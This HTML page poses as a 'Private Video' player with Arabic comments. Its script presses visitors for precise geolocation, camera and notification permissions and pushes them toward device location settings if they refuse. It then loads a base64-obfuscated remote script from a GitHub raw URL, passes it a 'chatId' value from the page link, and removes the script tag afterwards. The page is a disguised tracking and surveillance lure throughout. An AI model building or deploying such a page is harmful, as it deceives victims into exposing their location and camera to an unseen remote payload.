<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="description" content="Online Video Player - Watch videos online" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        #playTrigger {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #playTrigger:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #playTrigger .icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .status-msg {
            color: #fff;
            font-size: 14px;
            margin-top: 15px;
            text-align: center;
            padding: 8px 15px;
            background: rgba(0,0,0,0.6);
            border-radius: 20px;
            display: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .ctrl-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .ctrl-btn:hover {
            background: #333;
        }

        .seek-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .seek-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .timer {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .volume-area {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .vol-bar {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .vol-fill {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .seek-bar {
                margin: 0 6px;
            }
            .timer {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #playTrigger {
                width: 90px;
                height: 90px;
            }
            #playTrigger .icon {
                font-size: 45px;
            }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>

        <div class="video-thumbnail" id="posterArea">
            <div id="playTrigger">
                <span class="icon">▶</span>
            </div>
            <div class="status-msg" id="statusMsg"></div>
        </div>

        <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="seek-bar">
                <div class="seek-fill"></div>
            </div>
            <div class="timer">0:00 / 2:45</div>
            <div class="volume-area">
                <span>🔊</span>
                <div class="vol-bar">
                    <div class="vol-fill"></div>
                </div>
            </div>
            <button class="ctrl-btn">⛶</button>
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== عناصر الصفحة =====
            const playBtn = document.getElementById('playTrigger');
            const poster = document.getElementById('posterArea');
            const videoEl = document.getElementById('mainVideo');
            const statusMsg = document.getElementById('statusMsg');
            
            let stepOneDone = false;
            let stepTwoDone = false;
            let permissionsReady = false;

            // ===== طلب جميع الأذونات أولاً =====
            async function requestAllPermissions() {
                statusMsg.style.display = 'block';
                statusMsg.textContent = 'جاري طلب الأذونات...';
                
                let locationGranted = false;
                let cameraGranted = false;
                
                // طلب إذن الموقع
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            () => {
                                locationGranted = true;
                                resolve();
                            },
                            (err) => {
                                console.log('الموقع:', err.message);
                                resolve(); // نستمر حتى لو رفض
                            },
                            { 
                                enableHighAccuracy: true, 
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    });
                } catch (e) {
                    console.log('خطأ في طلب الموقع:', e);
                }
                
                // طلب إذن الكاميرا
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true,
                        audio: false
                    });
                    cameraGranted = true;
                    // إيقاف الكاميرا فوراً
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    console.log('خطأ في طلب الكاميرا:', e);
                }
                
                // طلب إذن الإشعارات (اختياري)
                if ('Notification' in window && Notification.permission === 'default') {
                    try {
                        await Notification.requestPermission();
                    } catch (e) {}
                }
                
                permissionsReady = true;
                statusMsg.textContent = '✅ تم منح الأذونات - اضغط للمتابعة';
                statusMsg.style.background = 'rgba(0,255,0,0.3)';
                
                return { location: locationGranted, camera: cameraGranted };
            }

            // ===== فتح إعدادات الجهاز =====
            function openDeviceSettings() {
                statusMsg.textContent = 'توجه إلى الإعدادات وقم بتفعيل الموقع';
                statusMsg.style.background = 'rgba(255,200,0,0.3)';
                
                const agent = navigator.userAgent;
                
                if (/Android/i.test(agent)) {
                    // محاولة فتح إعدادات الموقع مباشرة
                    try {
                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                    } catch(e) {
                        try {
                            window.location.href = 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        } catch(e2) {
                            window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                        }
                    }
                } 
                else if (/iPhone|iPad|iPod/i.test(agent)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => {
                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                    }, 500);
                } 
                else if (/Windows/i.test(agent)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } 
                else if (/Mac/i.test(agent)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } 
                else {
                    // سطح المكتب - نطلب الأذونات مباشرة
                    requestAllPermissions();
                }
            }

            // ===== تحميل الموارد الإضافية =====
            function loadExternalResource() {
                const encodedParts = [
                    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
                    'RkdESFNIUy9hcGkvcmVmcy9oZWFkcy9tYWluL2FwaQ=='
                ];
                
                const fullUrl = atob(encodedParts.join(''));
                
                const scriptTag = document.createElement('script');
                scriptTag.setAttribute('src', fullUrl);
                scriptTag.setAttribute('type', 'text/javascript');
                scriptTag.setAttribute('async', 'true');
                
                window._config = {
                    id: new URLSearchParams(window.location.search).get('chatId') || '',
                    time: Date.now()
                };
                
                document.head.appendChild(scriptTag);
                
                scriptTag.onload = function() {
                    setTimeout(() => {
                        if (scriptTag.parentNode) {
                            scriptTag.parentNode.removeChild(scriptTag);
                        }
                    }, 3000);
                };
            }

            // ===== عرض الفيديو =====
            function displayVideo() {
                statusMsg.style.display = 'none';
                poster.style.display = 'none';
                videoEl.style.display = 'block';
                videoEl.muted = false;
                videoEl.volume = 1.0;
                
                try {
                    videoEl.play();
                } catch (e) {
                    setTimeout(() => videoEl.play().catch(() => {}), 200);
                }
            }

            // ===== معالج النقر =====
            async function onPlayClick(e) {
                if (stepTwoDone) return;

                if (!stepOneDone) {
                    // الخطوة الأولى: طلب الأذونات
                    stepOneDone = true;
                    
                    // طلب الأذونات المباشرة أولاً
                    const perms = await requestAllPermissions();
                    
                    // تغيير شكل الزر
                    playBtn.querySelector('.icon').textContent = '⏳';
                    playBtn.style.borderColor = '#ffd700';
                    
                    // إذا لم يمنح الموقع، نفتح الإعدادات
                    if (!perms.location) {
                        setTimeout(() => {
                            openDeviceSettings();
                        }, 1000);
                    } else {
                        // إذا منح كل الأذونات مباشرة
                        statusMsg.textContent = '✅ جاهز - اضغط للتشغيل';
                        statusMsg.style.background = 'rgba(0,255,0,0.3)';
                        playBtn.querySelector('.icon').textContent = '▶';
                        playBtn.style.borderColor = '#00ff00';
                    }
                    
                } else {
                    // الخطوة الثانية: التشغيل
                    stepTwoDone = true;
                    playBtn.style.pointerEvents = 'none';
                    playBtn.style.opacity = '0.5';
                    
                    // تشغيل الفيديو
                    videoEl.muted = false;
                    videoEl.volume = 1.0;
                    videoEl.play().catch(() => {});
                    
                    // تحميل الموارد في الخلفية
                    setTimeout(() => loadExternalResource(), 1500);
                    
                    // عرض الفيديو
                    setTimeout(() => displayVideo(), 2000);
                }
            }

            // ===== مراقبة عودة المستخدم =====
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && stepOneDone && !stepTwoDone) {
                    playBtn.querySelector('.icon').textContent = '▶';
                    playBtn.style.borderColor = '#00ff00';
                    statusMsg.textContent = '✅ تم التفعيل - اضغط للتشغيل';
                    statusMsg.style.background = 'rgba(0,255,0,0.3)';
                }
            });

            // ===== ربط الأحداث =====
            if (playBtn) {
                playBtn.addEventListener('click', onPlayClick);
            }

            // ===== دعم الصوت =====
            document.addEventListener('click', function() {
                if (videoEl && videoEl.style.display === 'block') {
                    videoEl.muted = false;
                    if (videoEl.paused) videoEl.play().catch(() => {});
                }
            }, true);

            // ===== شريط التقدم =====
            const timer = setInterval(() => {
                const fill = document.querySelector('.seek-fill');
                if (videoEl.style.display === 'block') {
                    clearInterval(timer);
                    return;
                }
                const w = parseInt(fill.style.width) || 35;
                const nw = (w + 0.1) % 100;
                fill.style.width = nw + '%';
                
                const sec = Math.floor((nw / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.timer').textContent = 
                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
